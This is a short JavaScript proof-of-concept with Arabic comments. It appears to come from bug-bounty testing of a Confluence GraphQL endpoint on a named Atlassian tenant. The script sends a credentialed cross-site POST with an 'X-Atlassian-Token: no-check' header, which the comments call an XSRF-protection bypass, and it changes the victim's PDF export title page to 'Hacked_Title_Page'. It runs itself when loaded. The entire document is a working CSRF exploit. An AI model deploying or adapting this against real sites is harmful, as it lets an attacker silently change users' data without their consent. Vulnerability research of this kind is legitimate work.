function updatePdfConfig() {
  var xhttp = new XMLHttpRequest();
  // الرابط بناءً على طلبك الأخير
  var url = "https://anshall.atlassian.net/cgraphql?q=PdfExportPageUpdatePdfExportConfigurationMutation";

  xhttp.open("POST", url, true);

  // إعداد الرؤوس (Headers) الهامة جداً لنجاح هذا الطلب تحديداً
  xhttp.setRequestHeader("Content-type", "application/json");
  xhttp.setRequestHeader("Accept", "*/*");
  
  // الرؤوس المخصصة التي ظهرت في طلب الـ Burp Suite الخاص بك
  xhttp.setRequestHeader("X-Apollo-Operation-Name", "PdfExportPageUpdatePdfExportConfigurationMutation");
  xhttp.setRequestHeader("Atl-Agg-Confluence-Mutationerror-Compat", "false");
  
  // تجاوز حماية الـ XSRF
  xhttp.setRequestHeader("X-Atlassian-Token", "no-check");

  xhttp.withCredentials = true;

  // بناء محتوى الطلب (Payload)
  var data = JSON.stringify([{
    "operationName": "PdfExportPageUpdatePdfExportConfigurationMutation",
    "variables": {
      "input": {
        "titlePage": "Hacked_Title_Page", // القيمة التي سيتم تغييرها
        "header": "",
        "footer": "",
        "style": ""
      }
    },
    "query": "mutation PdfExportPageUpdatePdfExportConfigurationMutation($input: ConfluenceUpdatePdfExportConfigurationInput!) {\n  confluence {\n    updatePdfExportConfiguration(input: $input) {\n      success\n      errors {\n        message\n        extensions {\n          errorType\n          statusCode\n          __typename\n        }\n        __typename\n      } \n      __typename\n    }\n    __typename\n  }\n}\n"
  }]);

  xhttp.onreadystatechange = function() {
    if (this.readyState == 4) {
      console.log("Status: " + this.status);
      console.log("Response: " + this.responseText);
      
      // تحليل الرد للتأكد من النجاح
      if (this.responseText.includes('"success":true')) {
          console.log("✅ Mutation Successful!");
      } else {
          console.log("❌ Mutation Failed or returned errors.");
      }
    }
  };

  xhttp.send(data);
}

// تنفيذ العملية
updatePdfConfig();
